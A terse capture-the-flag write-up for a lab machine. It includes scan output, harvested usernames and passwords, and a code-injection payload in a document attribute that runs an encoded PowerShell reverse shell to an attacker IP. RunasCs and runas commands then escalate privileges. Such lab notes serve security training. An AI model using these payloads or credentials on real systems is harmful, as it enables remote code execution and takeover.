```
# Nmap 7.80 scan initiated Sat May 11 17:21:44 2024 as: nmap -p6791 -sCV -o 6791 -Pn 10.129.57.119
Nmap scan report for solarlab.htb (10.129.57.119)
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
6791/tcp open  http    nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 11 17:22:00 2024 -- 1 IP address (1 host up) scanned in 15.85 seconds
```

![smb](assets/smb.png)

```
exiftool old_leave_request_form.docx
ExifTool Version Number         : 12.57
File Name                       : old_leave_request_form.docx
Directory                       : .
File Size                       : 37 kB
File Modification Date/Time     : 2024:05:11 17:26:24-03:00
File Access Date/Time           : 2024:05:11 17:26:24-03:00
File Inode Change Date/Time     : 2024:05:11 17:26:24-03:00
File Permissions                : -rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x5c9ce90a
Zip Compressed Size             : 483
Zip Uncompressed Size           : 2460
Zip File Name                   : [Content_Types].xml
_NewReviewCycle                 : 
Creator                         : Alison Melville
Last Modified By                : Jackie
Revision Number                 : 3
Create Date                     : 2015:07:06 22:19:00Z
Modify Date                     : 2015:08:03 16:50:00Z
Template                        : Normal
Total Edit Time                 : 1 minute
Pages                           : 1
Words                           : 142
Characters                      : 814
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 6
Paragraphs                      : 1
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : Greig Melville Associates Limited
Links Up To Date                : No
Characters With Spaces          : 955
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 14.0000
```

```
Alison Melville
Paul Serban
Gayle Rennie
Katy Brown
```

```
blakeb
ThisCanB3typedeasily1@
```

https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/

```
            <para>
              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
                exploit
                </font>
            </para>
```

```bash
nc -lvp 5555
.\RunasCs.exe openfire "HotP!fireguard" cmd.exe -r 10.10.14.44:5555
.\runas.exe Administrator "ThisPasswordShouldDo!@" "cmd /c type C:\Users\Administrator\Desktop\root.txt"
```

## Links

- https://github.com/javipagan/openfire-blowfish/blob/master/TestOpenFireBlowFish.php